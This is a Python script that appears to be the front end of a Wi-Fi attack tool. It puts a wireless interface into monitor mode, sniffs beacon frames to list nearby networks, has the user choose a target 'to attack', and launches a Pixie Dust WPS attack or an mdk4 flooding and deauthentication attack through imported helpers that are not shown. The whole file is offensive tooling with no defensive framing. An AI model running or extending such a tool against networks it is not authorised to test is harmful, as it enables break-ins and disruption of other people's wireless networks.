import subprocess
import shlex
import os 
from scapy.all import sniff, Dot11, Dot11Elt
from scripts.ifmonitordown import monitor_up
from scripts.commands import run_pixie_dust
from scripts.commands import run_mdk4


while True:
    try:
        # Check if the script is run with root priviileges
        if os.geteuid() != 0:
            print("This script must be run as root. Please use 'sudo'.")
            exit(1)
        break
    except Exception as e:
        print(f"An error occurred: {e}")
        exit(1)
    
while True:
    interface = input("Enter the interface name: ")
    # Check if the interface exists
    if os.path.exists(f"/sys/class/net/{interface}"):
        break
    else:
        print(f"Interface '{interface}' does not exist. Please enter a valid interface name.")
# Monitor mode
monitor_up(interface)

#Wifi networks list
networks = []

def get_channel(pkt):
    elt = pkt.getlayer(Dot11Elt)
    while elt:
        if elt.ID == 3:
            #return ord(elt.info)
            if elt.info and len(elt.info) >= 1:
                return elt.info[0]

        elt = elt.payload.getlayer(Dot11Elt)
    return None

def scan_networks(packet):
    if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8:
        ssid = packet.info.decode('utf-8', errors='ignore')
        bssid = packet.addr2
        channel = get_channel(packet)
        if channel is not None and not any(net['BSSID'] == bssid for net in networks):
            networks.append({'SSID': ssid, 'BSSID': bssid, 'Channel': channel})
            print(f"SSID: {ssid}, BSSID: {bssid}, Channel: {channel}")

print("Scanning for networks (press Ctrl+C to stop)...")
try:
    sniff(iface=interface, prn=scan_networks, store=False)
except KeyboardInterrupt:
    print("\nScanning stopped by user.")

# Display networks
print("\nAvailable networks:")
for idx, net in enumerate(networks):
    print(f"{idx}: {net['SSID']} ({net['BSSID']}) on Channel {net['Channel']}")

# User selects a target
try:
    choice = int(input("Enter the number of the network to attack: "))
    target = networks[choice]
except (ValueError, IndexError):
    print("Invalid selection.")
    exit(1)

# Display select methods
while True:
    try:
        print("\nChoose an attack method:")
        print("1. Pixie Dust")
        print("2. mdk4")
        print("3. Exit")
        option = input("Choose attack method: ")

        if option == '1':
            run_pixie_dust(interface, target)
        elif option == '2':
            run_mdk4(interface, target)
        elif option == '3':
            print("Exiting.")
            break
        else:
            print("Invalid option.")
    except KeyboardInterrupt:
        print("\nExiting...")
        break
